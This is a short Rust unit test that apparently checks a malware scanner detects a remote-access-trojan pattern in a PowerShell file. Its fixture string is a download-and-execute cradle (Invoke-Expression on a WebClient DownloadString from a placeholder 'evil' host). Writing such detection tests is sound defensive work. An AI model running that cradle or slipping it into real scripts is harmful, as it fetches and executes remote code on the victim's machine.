use anyhow::Result;
use std::fs;
use wib_core::{scan_paths, ScanOptions, DetectionKind};

#[test]
fn detects_simple_rat_pattern() -> Result<()> {
	let dir = tempfile::tempdir()?;
	let file_path = dir.path().join("bad.ps1");
	fs::write(&file_path, "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil') # njrat")?;
	let opts = ScanOptions::default();
	let detections = scan_paths(&[file_path], opts);
	assert!(detections.iter().any(|d| matches!(d.kind, DetectionKind::Signature{..} | DetectionKind::Heuristic{..})), "no detection found");
	Ok(())
}